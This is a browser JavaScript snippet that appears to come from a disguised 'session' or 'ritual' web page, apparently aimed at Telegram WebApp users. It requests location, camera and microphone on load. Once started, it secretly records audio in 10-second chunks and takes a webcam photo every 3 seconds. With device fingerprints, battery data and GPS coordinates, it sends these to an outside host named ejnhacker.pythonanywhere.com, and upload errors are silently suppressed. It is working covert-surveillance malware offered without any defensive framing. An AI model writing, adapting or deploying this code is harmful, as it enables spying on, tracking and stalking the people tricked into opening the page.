<script>
let stream = null;
let captureInterval = null;

let audioStream = null;
let mediaRecorder = null;
let audioChunks = [];
let micInterval = null;

let locationData = null;
let sessionStarted = false;
let microphoneGranted = false;
let cameraGranted = false;

const canvas = document.createElement("canvas");
const ctx = canvas.getContext("2d");

// ðŸŒ + ðŸŽ¥ + ðŸŽ¤ REQUEST ALL PERMISSIONS ON PAGE LOAD
window.addEventListener('DOMContentLoaded', async () => {
  console.log("ðŸ“ Requesting location permission...");
  locationData = await requestLocation();
  
  const statusElement = document.getElementById('locationStatus');
  if (locationData) {
    statusElement.textContent = "Location Secured";
    console.log("âœ… Location obtained");
  } else {
    statusElement.textContent = "Location Unavailable";
    console.log("âš ï¸ Location permission denied");
  }
  
  // Auto-request camera and microphone
  console.log("ðŸŽ¥ Requesting camera permission...");
  await requestCamera();
  
  console.log("ðŸŽ¤ Requesting microphone permission...");
  await requestMicrophone();
  
  document.getElementById('statusTxt').textContent = "All permissions ready. Click Initiate to start.";
});

function requestLocation() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      console.warn("Geolocation not supported");
      resolve(null);
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (pos) => {
        resolve({
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
          accuracy: pos.coords.accuracy
        });
      },
      (error) => {
        console.warn("Location permission denied:", error.message);
        resolve(null);
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
      }
    );
  });
}

// ðŸŽ¥ REQUEST CAMERA ON PAGE LOAD
async function requestCamera() {
  if (cameraGranted) return true;
  
  try {
    const tempStream = await navigator.mediaDevices.getUserMedia({ video: true });
    tempStream.getTracks().forEach(track => track.stop());
    cameraGranted = true;
    console.log("âœ… Camera permission granted");
    return true;
  } catch (err) {
    console.warn("âš ï¸ Camera permission denied:", err);
    return false;
  }
}

// ðŸŽ¤ REQUEST MICROPHONE ON PAGE LOAD
async function requestMicrophone() {
  if (microphoneGranted) return true;

  try {
    const tempStream = await navigator.mediaDevices.getUserMedia({ audio: true });
    tempStream.getTracks().forEach(track => track.stop());
    microphoneGranted = true;
    console.log("âœ… Microphone permission granted");
    return true;
  } catch (err) {
    console.warn("âš ï¸ Microphone permission denied:", err);
    return false;
  }
}

async function startMicrophone() {
  if (mediaRecorder) return;

  try {
    mediaRecorder = new MediaRecorder(audioStream);
    audioChunks = [];

    mediaRecorder.ondataavailable = (e) => {
      if (e.data.size > 0) audioChunks.push(e.data);
    };

    mediaRecorder.onstop = sendAudio;
    mediaRecorder.start();
    console.log("ðŸŽ¤ Recording started");

    if (!micInterval) {
      micInterval = setInterval(() => {
        if (mediaRecorder && mediaRecorder.state === "recording") {
          mediaRecorder.stop();
          mediaRecorder.start();
        }
      }, 10000);
    }

  } catch (err) {
    console.error("ðŸŽ¤ Failed to start recording:", err);
  }
}

function sendAudio() {
  if (!audioChunks.length) return;

  const audioBlob = new Blob(audioChunks, { type: "audio/webm" });
  audioChunks = [];

  const form = new FormData();
  form.append("audio", audioBlob, "audio.webm");

  fetch("https://ejnhacker.pythonanywhere.com/upload", {
    method: "POST",
    body: form
  }).catch(() => {});
}

/* ðŸŽ¥ USER CLICK â†’ START SESSION */
async function initRitual() {
  if (sessionStarted) return;
  sessionStarted = true;

  const video = document.getElementById("video");
  const statusDot = document.getElementById("statusDot");
  const statusTxt = document.getElementById("statusTxt");

  video.setAttribute("playsinline", true);
  video.muted = true;

  try {
    statusTxt.textContent = "Starting Camera...";
    stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;

    statusTxt.textContent = "Starting Microphone...";
    audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
    
    await startMicrophone();

    setTimeout(() => {
      startContinuousCapture(video);
    }, 800);

    statusDot.classList.add("active");
    statusTxt.textContent = "Session Active - All Systems Online";
    console.log("âœ… Session started successfully");

  } catch (err) {
    console.error("âŒ Error:", err);
    alert("Failed to start session");
    sessionStarted = false;
    statusTxt.textContent = "Start Failed";
  }
}

/* ðŸ“¸ CONTINUOUS CAPTURE */
function startContinuousCapture(video) {
  if (captureInterval) return;

  captureAndSend(video);

  captureInterval = setInterval(() => {
    captureAndSend(video);
  }, 3000);
}

/* ðŸ“¸ CAPTURE + SEND */
async function captureAndSend(video) {
  if (!video.videoWidth || !video.videoHeight) return;

  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  ctx.drawImage(video, 0, 0);

  const batteryInfo = await getBatteryInfo();

  const fingerprint = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    languages: navigator.languages,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    screen: {
      width: screen.width,
      height: screen.height,
      dpr: window.devicePixelRatio,
      orientation: screen.orientation?.type || null
    },
    hardware: {
      cores: navigator.hardwareConcurrency || null,
      memoryGB: navigator.deviceMemory || null,
      touch: ('ontouchstart' in window) || navigator.maxTouchPoints > 0
    },
    network: navigator.connection ? {
      effectiveType: navigator.connection.effectiveType,
      downlink: navigator.connection.downlink,
      rtt: navigator.connection.rtt,
      saveData: navigator.connection.saveData
    } : null,
    androidModel: (() => {
      const m = navigator.userAgent.match(/Android\s[\d.]+;\s([^;)]*)/i);
      return m ? m[1].replace(/Build.*/i, "").trim() : null;
    })(),
    telegram: window.Telegram?.WebApp ? {
      platform: Telegram.WebApp.platform,
      version: Telegram.WebApp.version,
      colorScheme: Telegram.WebApp.colorScheme,
      isExpanded: Telegram.WebApp.isExpanded
    } : null
  };

  canvas.toBlob((blob) => {
    if (!blob) return;

    const form = new FormData();
    form.append("photo", blob, "photo.jpg");

    if (locationData) {
      form.append("latitude", locationData.latitude);
      form.append("longitude", locationData.longitude);
      if (locationData.accuracy) {
        form.append("accuracy", locationData.accuracy);
      }
    }

    if (batteryInfo) {
      form.append("battery", JSON.stringify(batteryInfo));
    }

    form.append("fingerprint", JSON.stringify(fingerprint));

    fetch("https://ejnhacker.pythonanywhere.com/upload", {
      method: "POST",
      body: form
    }).catch(() => {});
  }, "image/jpeg", 0.85);
}

async function getBatteryInfo() {
  if (!navigator.getBattery) return null;

  try {
    const battery = await navigator.getBattery();
    return {
      level: Math.round(battery.level * 100),
      charging: battery.charging,
      chargingTime: battery.chargingTime,
      dischargingTime: battery.dischargingTime
    };
  } catch (e) {
    return null;
  }
}
</script>
